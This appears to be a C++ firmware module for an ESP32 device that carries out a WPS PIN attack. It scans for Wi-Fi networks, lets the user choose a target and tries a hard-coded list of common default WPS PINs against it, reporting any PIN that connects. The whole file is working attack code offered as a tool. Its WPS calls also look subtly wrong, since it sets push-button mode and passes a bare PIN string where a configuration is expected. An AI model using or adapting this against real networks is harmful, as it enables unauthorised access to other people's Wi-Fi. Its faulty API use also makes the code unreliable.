#include "arsenal.h"
#include "arsenal_background.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

static const char *WPS_DEFAULT_PINS[] = {
    "52045123", "95749738", "02211064", "75627092",
    "65435627", "98765432", "55555555", "12345678",
    "22334455", "11223344", "00000000", "11111111",
    "12344321", "31333788", "66666666", "87654321"
};
static const int NUM_PINS = sizeof(WPS_DEFAULT_PINS) / sizeof(WPS_DEFAULT_PINS[0]);

void arsenal_wps_pin_attack(void) {
    ARSENAL_HEAP_CHECK();
    if (WiFi.getMode() == WIFI_MODE_NULL) WiFi.mode(WIFI_STA);

    int n = WiFi.scanNetworks(false, false);
    if (n == 0) {
        displayRedStripe("No networks found");
        delay(1500);
        return;
    }

    options.clear();
    for (int i = 0; i < n && i < 15; i++) {
        String label = WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dB)";
        options.push_back({label, [i]() {}});
    }
    int targetIdx = -1;
    for (int i = 0; i < n && i < 15; i++) {
        options[i].operation = [i, &targetIdx]() { targetIdx = i; };
    }
    loopOptions(options, MENU_TYPE_SUBMENU, "Target WPS");

    if (targetIdx < 0) return;

    String targetSSID = WiFi.SSID(targetIdx);
    uint8_t targetBSSID[6];
    memcpy(targetBSSID, WiFi.BSSID(targetIdx), 6);
    uint8_t targetChannel = WiFi.channel(targetIdx);
    WiFi.scanDelete();

    int tried = 0;
    unsigned long startTime = millis();
    bool success = false;

    while (tried < NUM_PINS && !success) {
        if (check(EscPress)) break;

        drawMainBorderWithTitle("WPS PIN Attack");
        int y = 40;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Target: %s", targetSSID.c_str());
        y += 14;
        tft.setCursor(12, y);
        tft.printf("BSSID: %02X:%02X:%02X..", targetBSSID[0], targetBSSID[1], targetBSSID[2]);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("PIN: %s", WPS_DEFAULT_PINS[tried]);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Tried: %d/%d", tried + 1, NUM_PINS);
        y += 14;
        unsigned long elapsed = (millis() - startTime) / 1000;
        tft.setCursor(12, y);
        tft.printf("Time: %lus", elapsed);
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);

        WiFi.disconnect();
        delay(200);

        esp_wifi_set_wps_type(WPS_TYPE_PBC);
        esp_wifi_wps_enable(WPS_DEFAULT_PINS[tried]);
        esp_wifi_wps_start(5000);

        unsigned long wpsStart = millis();
        while (millis() - wpsStart < 5000) {
            if (check(EscPress)) { tried = NUM_PINS; break; }
            delay(100);
        }

        int status = WiFi.status();
        if (status == WL_CONNECTED) {
            success = true;
            drawMainBorderWithTitle("WPS PIN Attack");
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(12, 45);
            tft.print("WPS SUCCESS!");
            tft.setCursor(12, 60);
            tft.printf("PIN: %s", WPS_DEFAULT_PINS[tried]);
            tft.setCursor(12, 76);
            tft.printf("SSID: %s", WiFi.SSID().c_str());
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.drawCentreString("Esc:done", tftWidth / 2, tftHeight - 20, 1);
            while (!check(EscPress)) delay(100);
        }

        tried++;
        esp_task_wdt_reset();
    }

    if (!success) {
        drawMainBorderWithTitle("WPS PIN Attack");
        tft.setTextColor(TFT_RED, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, 55);
        tft.printf("No luck. Tried %d PINs.", tried);
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString("Esc:done", tftWidth / 2, tftHeight - 20, 1);
        while (!check(EscPress)) delay(100);
    }
}
